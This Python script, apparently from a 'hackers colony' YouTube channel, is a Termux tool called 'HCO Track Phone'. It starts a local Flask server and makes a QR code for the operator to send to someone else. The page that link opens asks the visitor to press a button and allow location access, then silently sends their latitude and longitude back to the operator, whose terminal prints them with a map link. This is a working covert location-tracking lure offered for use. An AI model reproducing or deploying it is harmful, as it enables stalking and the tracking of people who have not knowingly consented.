# HCO Track Phone by Azhar - AUTO INSTALL VERSION
# Just run this one file - everything installs automatically!

import os
import sys
import subprocess
import threading
import time
import socket
from flask import Flask, request, render_template_string

# Color codes
RED = "\033[1;91m"
GREEN = "\033[1;92m"
CYAN = "\033[1;96m"
YELLOW = "\033[1;93m"
BLUE = "\033[1;94m"
RESET = "\033[0m"

locations = {}
app = Flask(__name__)

# Auto-install everything
def auto_install():
    print(f"{YELLOW}🔧 Auto-installing everything...{RESET}")
    
    # Update Termux packages
    print(f"{YELLOW}📦 Updating Termux packages...{RESET}")
    os.system('pkg update -y && pkg upgrade -y')
    
    # Install required system packages
    print(f"{YELLOW}📦 Installing system packages...{RESET}")
    os.system('pkg install python -y')
    os.system('pkg install curl -y')
    
    # Install Python packages
    print(f"{YELLOW}🐍 Installing Python packages...{RESET}")
    os.system('pip install flask qrcode[pil] requests --upgrade')
    
    print(f"{GREEN}✅ All packages installed successfully!{RESET}")

# Tool lock message
def tool_lock():
    os.system('clear')
    print(f"{RED}╔{'═'*78}╗{RESET}")
    print(f"{RED}║{'🔒 TOOL LOCKED 🔒'.center(78)}║{RESET}")
    print(f"{RED}║{'Subscribe to YouTube Channel'.center(78)}║{RESET}")
    print(f"{RED}║{'@hackers_colony_tech'.center(78)}║{RESET}")
    print(f"{RED}╚{'═'*78}╝{RESET}")
    time.sleep(2)
    
    try:
        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", 
                       "-d", "https://youtube.com/@hackers_colony_tech"],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{GREEN}✓ Opening YouTube...{RESET}")
    except:
        print(f"{YELLOW}⚠️  Open: youtube.com/@hackers_colony_tech{RESET}")
    
    time.sleep(3)

# Get local IP
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# Find available port
def find_port():
    for port in range(8080, 8100):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('0.0.0.0', port))
                return port
        except:
            continue
    return 8080

# Flask app
@app.route('/')
def home():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { 
                background: #000; 
                color: #fff; 
                text-align: center; 
                font-family: Arial; 
                padding: 20px;
            }
            .container { 
                max-width: 100%; 
                margin: 0 auto; 
                padding: 20px; 
            }
            .logo { 
                color: #f00; 
                font-size: 24px; 
                font-weight: bold; 
                margin: 20px 0; 
                text-shadow: 0 0 10px #f00;
            }
            .btn {
                background: #0f0;
                color: #000;
                border: none;
                padding: 20px 40px;
                font-size: 20px;
                font-weight: bold;
                border-radius: 10px;
                cursor: pointer;
                margin: 20px 0;
            }
            .message {
                font-size: 18px;
                margin: 20px 0;
                padding: 15px;
                border-radius: 10px;
                background: #222;
            }
            .success {
                color: #0f0;
                font-size: 22px;
                font-weight: bold;
                padding: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">HCO TRACK PHONE BY AZHAR</div>
            
            <div class="message">
                📱 <strong>HOW TO USE:</strong><br>
                1. Click the GREEN button<br>
                2. Click ALLOW when asked<br>
                3. That's it!
            </div>
            
            <button class="btn" onclick="getLocation()">📍 GET MY LOCATION</button>
            
            <div id="status" class="message">Click the button above to start</div>
        </div>
        
        <script>
        function getLocation() {
            var status = document.getElementById('status');
            var btn = document.querySelector('.btn');
            
            status.innerHTML = '🔄 Please wait...';
            btn.disabled = true;
            btn.innerHTML = '🔄 Processing...';
            
            if (!navigator.geolocation) {
                status.innerHTML = '❌ Browser not supported';
                btn.disabled = false;
                btn.innerHTML = '📍 TRY AGAIN';
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    sendLocation(position.coords.latitude, position.coords.longitude);
                },
                function(error) {
                    btn.disabled = false;
                    btn.innerHTML = '📍 TRY AGAIN';
                    status.innerHTML = '❌ Please allow location access and try again';
                },
                { timeout: 15000 }
            );
        }
        
        function sendLocation(lat, lon) {
            var status = document.getElementById('status');
            var btn = document.querySelector('.btn');
            
            status.innerHTML = '📡 Sending location...';
            
            fetch('/update', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({lat: lat, lon: lon})
            })
            .then(response => response.text())
            .then(data => {
                status.innerHTML = '<div class="success">✅ God Bless You! 🙏</div>' +
                                  '<div>Location sent successfully!</div>';
                btn.style.display = 'none';
            })
            .catch(error => {
                status.innerHTML = '❌ Error. Please try again.';
                btn.disabled = false;
                btn.innerHTML = '📍 TRY AGAIN';
            });
        }
        </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/update', methods=['POST'])
def update():
    try:
        data = request.get_json()
        if data and 'lat' in data and 'lon' in data:
            locations.clear()
            locations.update(data)
            locations['time'] = time.time()
            print(f"{GREEN}📍 Location received: {data['lat']}, {data['lon']}{RESET}")
            return "OK"
        return "ERROR"
    except:
        return "ERROR"

def start_server(port):
    try:
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
    except:
        pass

# Generate QR code
def make_qr(url):
    try:
        import qrcode
        qr = qrcode.QRCode(box_size=6, border=4)
        qr.add_data(url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="red", back_color="white")
        img.save("/data/data/com.termux/files/home/track_qr.png")
        
        try:
            subprocess.run(["termux-open", "/data/data/com.termux/files/home/track_qr.png"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    except:
        pass

# Main function
def main():
    # Auto-install everything first
    auto_install()
    
    # Show tool lock
    tool_lock()
    
    # Clear screen
    os.system('clear')
    
    print(f"{GREEN}🚀 Starting HCO Track Phone...{RESET}")
    
    # Get IP and port
    local_ip = get_local_ip()
    port = find_port()
    TRACKING_URL = f"http://{local_ip}:{port}"
    
    # Start server
    server_thread = threading.Thread(target=start_server, args=(port,), daemon=True)
    server_thread.start()
    time.sleep(2)
    
    # Generate QR code
    make_qr(TRACKING_URL)
    
    # Show info
    print(f"\n{RED}{'═'*60}{RESET}")
    print(f"{RED}{'HCO TRACK PHONE BY AZHAR'.center(60)}{RESET}")
    print(f"{RED}{'═'*60}{RESET}")
    print(f"\n{GREEN}📱 Send this link:{RESET}")
    print(f"{CYAN}{TRACKING_URL}{RESET}")
    print(f"\n{YELLOW}📍 QR code opened automatically{RESET}")
    print(f"\n{BLUE}💡 Both phones on same WiFi{RESET}")
    print(f"\n{RED}{'═'*60}{RESET}")
    
    # Wait for location
    print(f"\n{YELLOW}⏳ Waiting for location...{RESET}")
    print(f"{BLUE}Press Ctrl+C to stop{RESET}")
    
    last_time = 0
    while True:
        if 'time' in locations and locations['time'] > last_time:
            last_time = locations['time']
            print(f"\n{GREEN}✅ LOCATION RECEIVED!{RESET}")
            print(f"{GREEN}Latitude: {locations['lat']}{RESET}")
            print(f"{GREEN}Longitude: {locations['lon']}{RESET}")
            print(f"{GREEN}Maps: https://maps.google.com/?q={locations['lat']},{locations['lon']}{RESET}")
        
        time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}🛑 Stopped{RESET}")
    except Exception as e:
        print(f"{RED}❌ Error: {e}{RESET}")
